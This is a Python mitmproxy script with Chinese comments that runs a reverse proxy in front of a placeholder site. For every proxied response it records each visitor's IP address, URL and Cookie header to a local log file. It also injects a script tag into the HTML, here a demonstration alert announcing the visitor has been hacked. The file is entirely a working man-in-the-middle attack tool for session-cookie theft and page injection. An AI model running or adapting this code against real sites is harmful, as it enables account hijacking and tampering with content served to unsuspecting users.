# mitmdump —set allow_remote=true —listen-host 0.0.0.0 -s currentfile.py —mode reverse:http://xxx.xxx.xxx:80 -p 80
#—listen-host代表本地监听ip
#—mode reverse代表以反向代理的模式进行工作
#—set allow_remote=true代表支持客户端访问的时候是通过代理访问的

import os
import re
import chardet


def request(flow):
    # url=flow.request.url
    # flow.request.headers['User-Agent']='xxx'
    pass


def response(flow):
    url = flow.request.url
    print(url)
    if "http://xxx.xxx.xxx" in url:
        content = flow.response.content
        cookie = flow.request.headers['Cookie']
        ip = str(flow.client_conn.ip_address).split(":")[0]
        bytes_encoding = chardet.detect(content)['encoding']
        origin_html = content.decode(encoding=bytes_encoding, errors="ignore")
        if "</html>" in origin_html:
            insert_xss = '''<script>alert("you're hacked")</script></html>'''
            new_html = origin_html.replace("</html>", insert_xss)
            flow.response.text = new_html
        return_value = {'ip': ip, 'url': url, 'cookie': cookie}
        with open("mitm.log", "a+") as f:
            f.write(str(return_value) + "\n")
